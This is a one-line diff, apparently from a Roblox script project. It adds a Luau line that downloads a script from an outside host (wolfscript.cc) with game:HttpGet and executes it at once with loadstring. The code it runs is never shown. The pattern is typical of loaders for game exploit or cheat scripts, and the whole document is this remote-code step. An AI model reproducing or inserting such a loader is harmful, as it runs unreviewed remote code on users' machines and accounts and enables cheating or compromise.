@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://v1.wolfscript.cc/twd_online.luau"))()
